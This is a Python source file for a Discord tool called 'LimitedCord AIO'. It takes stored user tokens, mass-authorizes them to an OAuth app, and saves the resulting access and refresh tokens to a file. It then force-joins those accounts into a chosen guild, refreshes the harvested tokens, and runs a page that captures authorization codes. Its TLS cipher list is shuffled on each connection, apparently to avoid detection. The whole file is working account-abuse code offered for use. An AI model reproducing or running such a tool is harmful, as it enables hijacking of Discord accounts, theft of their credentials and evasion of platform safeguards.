import httpx, certifi, colorama, sys, os, ctypes, pystyle, threading, time;
from random import randint; from colorama import Fore, init; from datetime import datetime;
from flask import Flask, render_template, redirect, request; from flask_cors import CORS;

pystyle.System.Clear()
print("Loading Ssl Context...")
time.sleep(2)

ctypes.windll.kernel32.SetConsoleTitleW(f'LimitedCord AIO | By Void. | Spacex Runs Cord!')
pystyle.System.Size(115,24)
pystyle.System.Clear()
max_threads = 5
text = """
             __ _           _ _           _   ___              _
            / /(_)_ __ ___ (_) |_ ___  __| | / __\___  _ __ __| |
           / / | | '_ ` _ \| | __/ _ \/ _` |/ /  / _ \| '__/ _` |
          / /__| | | | | | | | ||  __/ (_| / /__| (_) | | | (_| |
          \____/_|_| |_| |_|_|\__\___|\__,_\____/\___/|_|  \__,_|         

                                › Press Enter...
"""
pystyle.Anime.Fade(pystyle.Center.Center(text), pystyle.Colors.rainbow, pystyle.Colorate.Vertical, interval=0.020, enter=True)

def ThreadManager():
    global max_threads
    while True: 
        if threading.active_count() >= max_threads:
            time.sleep(1)
    
class Logger:
    def CenterText(var:str, space:int=None): # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    
    def Success(text):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        lock = threading.Lock()
        lock.acquire()
        print(f'[{current_time}] ({Fore.LIGHTGREEN_EX}+{Fore.WHITE}) {text}')
        lock.release()
    
    def Error(text):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        lock = threading.Lock()
        lock.acquire()
        print(f'[{current_time}] ({Fore.RED}-{Fore.WHITE}) {text}')
        lock.release()
    
    def Question(text):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        lock = threading.Lock()
        lock.acquire()
        print(f'[{current_time}] ({Fore.YELLOW}?{Fore.WHITE}) {text}')
        lock.release()
    
    def Debug(text):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        lock = threading.Lock()
        lock.acquire()
        print(f'[{current_time}] [DEBUG] ({Fore.LIGHTBLUE_EX}*{Fore.WHITE}) {text}')
        lock.release()
    
    def Console():
        pystyle.System.Clear()
        print(f'''
[38;2;5;189;245m [38;2;9;187;245m [38;2;13;185;245m [38;2;17;183;245m_[38;2;21;181;245m_[38;2;25;179;245m [38;2;29;177;245m_[38;2;33;175;245m [38;2;37;173;245m [38;2;41;171;245m [38;2;45;169;245m [38;2;49;167;245m [38;2;53;165;245m [38;2;57;163;245m [38;2;61;161;245m [38;2;65;159;245m [38;2;69;157;245m [38;2;73;155;245m [38;2;77;153;245m_[38;2;81;151;245m [38;2;85;149;245m_[38;2;89;147;245m [38;2;93;145;245m [38;2;97;143;245m [38;2;101;141;245m [38;2;105;139;245m [38;2;109;137;245m [38;2;113;135;245m [38;2;117;133;245m [38;2;121;131;245m [38;2;125;129;245m [38;2;129;127;245m [38;2;133;125;245m_[38;2;137;123;245m [38;2;141;121;245m [38;2;145;119;245m [38;2;149;117;245m_[38;2;153;115;245m_[38;2;157;113;245m_[38;2;161;111;245m [38;2;165;109;245m [38;2;169;107;245m [38;2;173;105;245m [38;2;177;103;245m [38;2;181;101;245m [38;2;185;99;245m [38;2;189;97;245m [38;2;193;95;245m [38;2;197;93;245m [38;2;201;91;245m [38;2;205;89;245m [38;2;209;87;245m [38;2;213;85;245m [38;2;217;83;245m_[38;2;221;81;245m 
[38;2;5;189;245m [38;2;9;187;245m [38;2;13;185;245m/[38;2;17;183;245m [38;2;21;181;245m/[38;2;25;179;245m([38;2;29;177;245m_[38;2;33;175;245m)[38;2;37;173;245m_[38;2;41;171;245m [38;2;45;169;245m_[38;2;49;167;245m_[38;2;53;165;245m [38;2;57;163;245m_[38;2;61;161;245m_[38;2;65;159;245m_[38;2;69;157;245m [38;2;73;155;245m([38;2;77;153;245m_[38;2;81;151;245m)[38;2;85;149;245m [38;2;89;147;245m|[38;2;93;145;245m_[38;2;97;143;245m [38;2;101;141;245m_[38;2;105;139;245m_[38;2;109;137;245m_[38;2;113;135;245m [38;2;117;133;245m [38;2;121;131;245m_[38;2;125;129;245m_[38;2;129;127;245m|[38;2;133;125;245m [38;2;137;123;245m|[38;2;141;121;245m [38;2;145;119;245m/[38;2;149;117;245m [38;2;153;115;245m_[38;2;157;113;245m_[38;2;161;111;245m\[38;2;165;109;245m_[38;2;169;107;245m_[38;2;173;105;245m_[38;2;177;103;245m [38;2;181;101;245m [38;2;185;99;245m_[38;2;189;97;245m [38;2;193;95;245m_[38;2;197;93;245m_[38;2;201;91;245m [38;2;205;89;245m_[38;2;209;87;245m_[38;2;213;85;245m|[38;2;217;83;245m [38;2;221;81;245m|
[38;2;5;189;245m [38;2;9;187;245m/[38;2;13;185;245m [38;2;17;183;245m/[38;2;21;181;245m [38;2;25;179;245m|[38;2;29;177;245m [38;2;33;175;245m|[38;2;37;173;245m [38;2;41;171;245m'[38;2;45;169;245m_[38;2;49;167;245m [38;2;53;165;245m`[38;2;57;163;245m [38;2;61;161;245m_[38;2;65;159;245m [38;2;69;157;245m\[38;2;73;155;245m|[38;2;77;153;245m [38;2;81;151;245m|[38;2;85;149;245m [38;2;89;147;245m_[38;2;93;145;245m_[38;2;97;143;245m/[38;2;101;141;245m [38;2;105;139;245m_[38;2;109;137;245m [38;2;113;135;245m\[38;2;117;133;245m/[38;2;121;131;245m [38;2;125;129;245m_[38;2;129;127;245m`[38;2;133;125;245m [38;2;137;123;245m|[38;2;141;121;245m/[38;2;145;119;245m [38;2;149;117;245m/[38;2;153;115;245m [38;2;157;113;245m [38;2;161;111;245m/[38;2;165;109;245m [38;2;169;107;245m_[38;2;173;105;245m [38;2;177;103;245m\[38;2;181;101;245m|[38;2;185;99;245m [38;2;189;97;245m'[38;2;193;95;245m_[38;2;197;93;245m_[38;2;201;91;245m/[38;2;205;89;245m [38;2;209;87;245m_[38;2;213;85;245m`[38;2;217;83;245m [38;2;221;81;245m|
[38;2;5;189;245m/[38;2;9;187;245m [38;2;13;185;245m/[38;2;17;183;245m_[38;2;21;181;245m_[38;2;25;179;245m|[38;2;29;177;245m [38;2;33;175;245m|[38;2;37;173;245m [38;2;41;171;245m|[38;2;45;169;245m [38;2;49;167;245m|[38;2;53;165;245m [38;2;57;163;245m|[38;2;61;161;245m [38;2;65;159;245m|[38;2;69;157;245m [38;2;73;155;245m|[38;2;77;153;245m [38;2;81;151;245m|[38;2;85;149;245m [38;2;89;147;245m|[38;2;93;145;245m|[38;2;97;143;245m [38;2;101;141;245m [38;2;105;139;245m_[38;2;109;137;245m_[38;2;113;135;245m/[38;2;117;133;245m [38;2;121;131;245m([38;2;125;129;245m_[38;2;129;127;245m|[38;2;133;125;245m [38;2;137;123;245m/[38;2;141;121;245m [38;2;145;119;245m/[38;2;149;117;245m_[38;2;153;115;245m_[38;2;157;113;245m|[38;2;161;111;245m [38;2;165;109;245m([38;2;169;107;245m_[38;2;173;105;245m)[38;2;177;103;245m [38;2;181;101;245m|[38;2;185;99;245m [38;2;189;97;245m|[38;2;193;95;245m [38;2;197;93;245m|[38;2;201;91;245m [38;2;205;89;245m([38;2;209;87;245m_[38;2;213;85;245m|[38;2;217;83;245m [38;2;221;81;245m|
[38;2;5;189;245m\[38;2;9;187;245m_[38;2;13;185;245m_[38;2;17;183;245m_[38;2;21;181;245m_[38;2;25;179;245m/[38;2;29;177;245m_[38;2;33;175;245m|[38;2;37;173;245m_[38;2;41;171;245m|[38;2;45;169;245m [38;2;49;167;245m|[38;2;53;165;245m_[38;2;57;163;245m|[38;2;61;161;245m [38;2;65;159;245m|[38;2;69;157;245m_[38;2;73;155;245m|[38;2;77;153;245m_[38;2;81;151;245m|[38;2;85;149;245m\[38;2;89;147;245m_[38;2;93;145;245m_[38;2;97;143;245m\[38;2;101;141;245m_[38;2;105;139;245m_[38;2;109;137;245m_[38;2;113;135;245m|[38;2;117;133;245m\[38;2;121;131;245m_[38;2;125;129;245m_[38;2;129;127;245m,[38;2;133;125;245m_[38;2;137;123;245m\[38;2;141;121;245m_[38;2;145;119;245m_[38;2;149;117;245m_[38;2;153;115;245m_[38;2;157;113;245m/[38;2;161;111;245m\[38;2;165;109;245m_[38;2;169;107;245m_[38;2;173;105;245m_[38;2;177;103;245m/[38;2;181;101;245m|[38;2;185;99;245m_[38;2;189;97;245m|[38;2;193;95;245m [38;2;197;93;245m [38;2;201;91;245m\[38;2;205;89;245m_[38;2;209;87;245m_[38;2;213;85;245m,[38;2;217;83;245m_[38;2;221;81;245m|
[38;2;5;189;245m [38;2;9;187;245m [38;2;13;185;245m [38;2;17;183;245m [38;2;21;181;245m [38;2;25;179;245m [38;2;29;177;245m [38;2;33;175;245m [38;2;37;173;245m [38;2;41;171;245m [38;2;45;169;245m [38;2;49;167;245m [38;2;53;165;245m [38;2;57;163;245m [38;2;61;161;245m [38;2;65;159;245m [38;2;69;157;245m [38;2;73;155;245m [38;2;77;153;245m [38;2;81;151;245m [38;2;85;149;245m [38;2;89;147;245m [38;2;93;145;245m [38;2;97;143;245m [38;2;101;141;245m [38;2;105;139;245m [38;2;109;137;245m [38;2;113;135;245m [38;2;117;133;245m [38;2;121;131;245m [38;2;125;129;245m [38;2;129;127;245m [38;2;133;125;245m [38;2;137;123;245m [38;2;141;121;245m [38;2;145;119;245m [38;2;149;117;245m [38;2;153;115;245m [38;2;157;113;245m [38;2;161;111;245m [38;2;165;109;245m [38;2;169;107;245m [38;2;173;105;245m [38;2;177;103;245m [38;2;181;101;245m [38;2;185;99;245m [38;2;189;97;245m [38;2;193;95;245m [38;2;197;93;245m [38;2;201;91;245m [38;2;205;89;245m [38;2;209;87;245m [38;2;213;85;245m [38;2;217;83;245m [38;2;221;81;245m 
[38;2;5;189;245m[[38;2;9;186;245m [38;2;13;183;245mV[38;2;17;180;245me[38;2;21;177;245mr[38;2;25;174;245ms[38;2;29;171;245mi[38;2;33;168;245mo[38;2;37;165;245mn[38;2;41;162;245m [38;2;45;159;245m:[38;2;49;156;245m [38;2;53;153;245m1[38;2;57;150;245m.[38;2;61;147;245m0[38;2;65;144;245m [38;2;69;141;245m([38;2;73;138;245mP[38;2;77;135;245mT[38;2;81;132;245mB[38;2;85;129;245m)[38;2;89;126;245m [38;2;93;123;245m|[38;2;97;120;245m [38;2;101;117;245mD[38;2;105;114;245me[38;2;109;111;245mv[38;2;113;108;245me[38;2;117;105;245ml[38;2;121;102;245mo[38;2;125;99;245mp[38;2;129;96;245me[38;2;133;93;245mr[38;2;137;90;245ms[38;2;141;87;245m [38;2;145;84;245m:[38;2;149;81;245m [38;2;153;78;245mV[38;2;157;75;245mo[38;2;161;72;245mi[38;2;165;69;245md[38;2;169;66;245m,[38;2;173;63;245m [38;2;177;60;245mE[38;2;181;57;245mx[38;2;185;54;245mp[38;2;189;51;245ml[38;2;193;48;245mo[38;2;197;45;245mi[38;2;201;42;245mt[38;2;205;39;245m [38;2;209;36;245m]

[38;2;5;189;245mM[38;2;46;163;239me[38;2;87;137;233mn[38;2;128;111;227mu[38;2;169;85;221m:
[38;2;5;189;245m [38;2;10;186;245m [38;2;15;183;245m|[38;2;20;180;245m [38;2;25;177;245m-[38;2;30;174;245m [38;2;35;171;245m0[38;2;40;168;245m1[38;2;45;165;245m)[38;2;50;162;245m [38;2;55;159;245mA[38;2;60;156;245mu[38;2;65;153;245mt[38;2;70;150;245mh[38;2;75;147;245mo[38;2;80;144;245mr[38;2;85;141;245mi[38;2;90;138;245mz[38;2;95;135;245me[38;2;100;132;245mr[38;2;105;129;245m [38;2;110;126;245m [38;2;115;123;245m:[38;2;120;120;245m [38;2;125;117;245m[[38;2;130;114;245mM[38;2;135;111;245ma[38;2;140;108;245ms[38;2;145;105;245ms[38;2;150;102;245m [38;2;155;99;245mA[38;2;160;96;245mu[38;2;165;93;245mt[38;2;170;90;245mh[38;2;175;87;245mo[38;2;180;84;245mr[38;2;185;81;245mi[38;2;190;78;245mz[38;2;195;75;245me[38;2;200;72;245ms[38;2;205;69;245m [38;2;210;66;245mT[38;2;215;63;245mo[38;2;220;60;245mk[38;2;225;57;245me[38;2;230;54;245mn[38;2;235;51;245ms[38;2;240;48;245m]
[38;2;5;189;245m [38;2;10;186;245m [38;2;15;183;245m|[38;2;20;180;245m [38;2;25;177;245m-[38;2;30;174;245m [38;2;35;171;245m0[38;2;40;168;245m2[38;2;45;165;245m)[38;2;50;162;245m [38;2;55;159;245mA[38;2;60;156;245mu[38;2;65;153;245mt[38;2;70;150;245mh[38;2;75;147;245m [38;2;80;144;245mJ[38;2;85;141;245mo[38;2;90;138;245mi[38;2;95;135;245mn[38;2;100;132;245me[38;2;105;129;245mr[38;2;110;126;245m [38;2;115;123;245m:[38;2;120;120;245m [38;2;125;117;245m[[38;2;130;114;245mM[38;2;135;111;245ma[38;2;140;108;245ms[38;2;145;105;245ms[38;2;150;102;245m [38;2;155;99;245mJ[38;2;160;96;245mo[38;2;165;93;245mi[38;2;170;90;245mn[38;2;175;87;245ms[38;2;180;84;245m [38;2;185;81;245mA[38;2;190;78;245mu[38;2;195;75;245mt[38;2;200;72;245mh[38;2;205;69;245m [38;2;210;66;245mT[38;2;215;63;245mo[38;2;220;60;245mk[38;2;225;57;245me[38;2;230;54;245mn[38;2;235;51;245ms[38;2;240;48;245m]
[38;2;5;189;245m [38;2;10;186;245m [38;2;15;183;245m|[38;2;20;180;245m [38;2;25;177;245m-[38;2;30;174;245m [38;2;35;171;245m0[38;2;40;168;245m3[38;2;45;165;245m)[38;2;50;162;245m [38;2;55;159;245mR[38;2;60;156;245me[38;2;65;153;245mf[38;2;70;150;245mr[38;2;75;147;245me[38;2;80;144;245ms[38;2;85;141;245mh[38;2;90;138;245me[38;2;95;135;245mr[38;2;100;132;245m [38;2;105;129;245m [38;2;110;126;245m [38;2;115;123;245m:[38;2;120;120;245m [38;2;125;117;245m[[38;2;130;114;245mM[38;2;135;111;245ma[38;2;140;108;245ms[38;2;145;105;245ms[38;2;150;102;245m [38;2;155;99;245mR[38;2;160;96;245me[38;2;165;93;245mf[38;2;170;90;245mr[38;2;175;87;245me[38;2;180;84;245ms[38;2;185;81;245mh[38;2;190;78;245me[38;2;195;75;245ms[38;2;200;72;245m [38;2;205;69;245m [38;2;210;66;245mT[38;2;215;63;245mo[38;2;220;60;245mk[38;2;225;57;245me[38;2;230;54;245mn[38;2;235;51;245ms[38;2;240;48;245m]
[38;2;5;189;245m [38;2;10;186;245m [38;2;15;183;245m|[38;2;20;180;245m [38;2;25;177;245m-[38;2;30;174;245m [38;2;35;171;245m0[38;2;40;168;245m4[38;2;45;165;245m)[38;2;50;162;245m [38;2;55;159;245mS[38;2;60;156;245me[38;2;65;153;245mr[38;2;70;150;245mv[38;2;75;147;245me[38;2;80;144;245mr[38;2;85;141;245m [38;2;90;138;245m [38;2;95;135;245m [38;2;100;132;245m [38;2;105;129;245m [38;2;110;126;245m [38;2;115;123;245m:[38;2;120;120;245m [38;2;125;117;245m[[38;2;130;114;245mS[38;2;135;111;245mt[38;2;140;108;245ma[38;2;145;105;245mr[38;2;150;102;245mt[38;2;155;99;245ms[38;2;160;96;245m [38;2;165;93;245mA[38;2;170;90;245m [38;2;175;87;245mA[38;2;180;84;245mu[38;2;185;81;245mt[38;2;190;78;245mh[38;2;195;75;245m [38;2;200;72;245mS[38;2;205;69;245me[38;2;210;66;245mr[38;2;215;63;245mv[38;2;220;60;245me[38;2;225;57;245mr[38;2;230;54;245m [38;2;235;51;245m [38;2;240;48;245m]
            {Fore.RESET}
        ''')
    
class SSLContext(object):
    def GetContext():
        ciphers_top = "ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM"
        ciphers_mid = 'DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES'
        cl = ciphers_mid.split(":")
        cl_len = len(cl)
        els = []
        
        for i in range(cl_len):
            idx = randint(0, cl_len-1)
            els.append(cl[idx])
            del cl[idx]
            cl_len-=1
        
        ciphers2 = ciphers_top+":".join(els)
        context = httpx.create_ssl_context()
        context.load_verify_locations(cafile=certifi.where())
        context.set_alpn_protocols(["h2"])
        context.minimum_version.MAXIMUM_SUPPORTED
        CIPHERS = ciphers2
        context.set_ciphers(CIPHERS)
        
        ciphers2
    
    def GetTransport():
        return httpx.HTTPTransport(retries=3)
    
class Authorizer(object):
    def __init__(self):
        global max_threads; max_threads = 25;

        Logger.Question('Please enter your client id :')
        self.client_id = input(f'')
        Logger.Question('Please enter your client secret :')
        self.secret = input('')
        Logger.Question('Please enter your redirect :')
        self.redirect = input('')

        self.auth_url = f'https://discord.com/api/oauth2/authorize?client_id={self.client_id}&redirect_uri={self.redirect}&response_type=code&scope=identify%20guilds.join'
        self.task_thread = []; self.authed = 0; self.failed = 0; self.total = 0;
    
    def authorize(self, token):
        session = httpx.Client(transport=SSLContext.GetTransport(), verify=SSLContext.GetContext(), timeout=None)

        res = session.post(self.auth_url, json={"authorize": "true"}, headers={"Authorization": token})
        if res.status_code in (200, 201, 204):
            location = res.json()['location']
            code = location.split(f'?code=')[1]
            
            resp = session.post("https://discordapp.com/api/oauth2/token", headers={ 'Content-Type': 'application/x-www-form-urlencoded' }, data= { 'client_id': self.client_id, 'client_secret': self.secret, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': self.redirect })

            uir = session.get("https://canary.discord.com/api/v9/users/@me", headers={"Authorization": f'Bearer {resp.json()["access_token"]}'})
            userinfo = uir.json()

            with open('data/auths.txt', 'a') as rfile:
                rfile.write(f'{userinfo["id"]}:{resp.json()["access_token"]}:{resp.json()["refresh_token"]}\n')
                rfile.close()
            
            Logger.Success(f'Successfully Authed {userinfo["username"]}#{userinfo["discriminator"]} ({resp.json()["access_token"]})')
            self.authed += 1

            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Mass Authorizer | Authorized : {self.authed} | Failed : {self.failed} | Tokens Loaded : {self.total}')
        else:
            self.failed += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Mass Authorizer | Authorized : {self.authed} | Failed : {self.failed} | Tokens Loaded : {self.total}')
        pass

    def start(self):
        with open('data/tokens.txt') as file:
            tokens = file.readlines()
            self.total = len(tokens)
            for token in tokens:
                token = token.strip('\n')
                
                self.task_thread.append(threading.Thread(target=self.authorize, args=[token]))
            
            for t in self.task_thread:
                if not t.is_alive():
                    t.start()
                    
            for t in self.task_thread:
                t.join()
           
            while threading.active_count() >= 4:
                time.sleep(1)
            time.sleep(3)
                
class Joiner(object):
    def __init__(self):
        global max_threads; max_threads = 4;

        Logger.Question('Please enter your bot token :')
        self.token = input(f'')
        Logger.Question('Please enter guild id :')
        self.guild_id = input(f'')
        
        self.task_thread = []; self.joined = 0; self.failed = 0; self.total = 0; 
    
    def join(self, auth_token, user_id):
        session = httpx.Client(transport=SSLContext.GetTransport(), verify=SSLContext.GetContext(), timeout=None)
        
        response = session.put(f'https://canary.discord.com/api/v9/guilds/{self.guild_id}/members/{user_id}', json={"access_token": auth_token }, headers={ "Authorization": f"Bot {self.token}"})
        if response.status_code in (200, 201, 204):
            Logger.Success(f'Successfully Joined : {user_id}')
            self.joined += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Joiner | Joined : {self.joined} | Failed : {self.failed} | Tokens Loaded : {self.total} | Guild : {self.guild_id}')
        else:
            Logger.Error(f'Failed To Join {user_id} in {self.guild_id} ({response.status_code})')
            self.failed += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Joiner | Joined : {self.joined} | Failed : {self.failed} | Tokens Loaded : {self.total} | Guild : {self.guild_id}')
        
    def start(self):
        with open('data/auths.txt') as file:
            auths = file.readlines()
            self.total = len(auths)
            
            for combo in auths:
                combo = combo.strip('\n')
                
                user_id = combo.split(':')[0]
                auth_token = combo.split(':')[1]
                self.join(auth_token, user_id)
            time.sleep(3)

class Refresher(object):
    def __init__(self):
        global max_threads; max_threads = 25;

        Logger.Question('Please enter your client id :')
        self.client_id = input(f'')
        Logger.Question('Please enter your client secret :')
        self.secret = input('')

        self.task_thread = []; self.refreshed = 0; self.failed = 0; self.total = 0; 
    
    def refresh(self, refresh_token, user_id):
        session = httpx.Client(transport=SSLContext.GetTransport(), verify=SSLContext.GetContext(), timeout=None)

        resp = session.post("https://discordapp.com/api/oauth2/token", headers={ 'Content-Type': 'application/x-www-form-urlencoded' }, data= { 'client_id': self.client_id, 'client_secret': self.secret, 'grant_type': 'refresh_token', 'refresh_token': refresh_token })
        
        if resp.status_code in (200, 201, 204):
            with open('data/refreshed.txt', 'a') as rfile:
                rfile.write(f'{user_id}:{resp.json()["access_token"]}:{resp.json()["refresh_token"]}\n')
                rfile.close()
            Logger.Success(f'Successfully refreshed {user_id} ({resp.json()["access_token"]}')
            self.refreshed += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Refresher | Refreshed : {self.refreshed} | Failed : {self.failed} | Tokens Loaded : {self.total}')
        else:
            Logger.Error(f'Failed To Refresh : {user_id} ({resp.json()})')
            self.failed += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Refresher | Refreshed : {self.refreshed} | Failed : {self.failed} | Tokens Loaded : {self.total}')
        
    def start(self):
        with open('data/auths.txt') as file:
            auths = file.readlines()
            self.total = len(auths)
            for combo in auths:
                combo = combo.strip('\n')
                
                user_id = combo.split(':')[0]
                refresh_token = combo.split(':')[2]
                
                self.task_thread.append(threading.Thread(target=self.refresh, args=[refresh_token, user_id]))
            
            for t in self.task_thread:
                t.start()
            
            for t in self.task_thread:
                t.join()
            
            time.sleep(3)

class Server(object):
    def __init__(self):
        Logger.Question('Please enter your client id :')
        self.client_id = input(f'')
        Logger.Question('Please enter your client secret :')
        self.secret = input('')
        Logger.Question('Please enter your redirect :')
        self.redirect = input('')
        
        self.auth_url = f'https://discord.com/api/oauth2/authorize?client_id={self.client_id}&redirect_uri={self.redirect}&response_type=code&scope=identify%20guilds.join'
    
    def start(self):
        self.server = Flask(__name__); CORS(self.server)

        session = httpx.Client(transport=SSLContext.GetTransport(), verify=SSLContext.GetContext(), timeout=None)
        
        with open(f'others/replace.html') as file:
            text = file.read().replace('%URL_HERE%', self.auth_url)
            write_file = open('templates/index.html', 'w')
            write_file.write(text)
            write_file.close(); file.close()

        @self.server.route('/')
        def hello_world():
            return render_template('index.html')
        
        @self.server.route('/auth')
        def authorize():
            if request.args['code'] == None:
                return "Please Enter a Auth Code In Query"
            else:
                code = request.args['code'] 
                resp = session.post("https://discordapp.com/api/oauth2/token", headers={ 'Content-Type': 'application/x-www-form-urlencoded' }, data= { 'client_id': self.client_id, 'client_secret': self.secret, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': self.redirect })
                uir = session.get("https://canary.discord.com/api/v9/users/@me", headers={"Authorization": f'Bearer {resp.json()["access_token"]}'})
                userinfo = uir.json()
                
                with open('data/auths.txt', 'a') as rfile:
                    rfile.write(f'{userinfo["id"]}:{resp.json()["access_token"]}:{resp.json()["refresh_token"]}\n')
                    rfile.close()
                    
                Logger.Success(f'Successfully Authed {userinfo["username"]}#{userinfo["discriminator"]} ({resp.json()["access_token"]})')
                return redirect("https://discord.com/oauth2/authorized", code=302)

        self.server.run(host="0.0.0.0", port=80)

def LimitedCord():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW(f'LimitedCord AIO | Main Menu | By Void. | Spacex Tools')
        Logger.Console()
        Logger.Question('Please enter your input :')
        try:
            input_txt = int(input(''))
        except Exception as e:
            Logger.Error('Please Enter a Valid Input')
        
        if input_txt == 1:
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Mass Authorizer | Authorized : 0 | Failed : 0 | Tokens Loaded : 0')
            client = Authorizer()
            client.start()
        
        elif input_txt == 2:
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Joiner | Joined : 0 | Failed : 0 | Tokens Loaded : 0 | Guild : Loading...')
            client = Joiner()
            client.start()
        
        elif input_txt == 3:
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Refresher | Refreshed : 0 | Failed : 0 | Tokens Loaded : 0')
            client = Refresher()
            client.start()
        
        elif input_txt == 4:
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LimitedCord AIO] - Module : Auth Server | Listening On Localhost (80)')
            client = Server()
            client.start()

if __name__ == "__main__":
    threading.Thread(target=ThreadManager).start()
    threading.Thread(target=LimitedCord).start()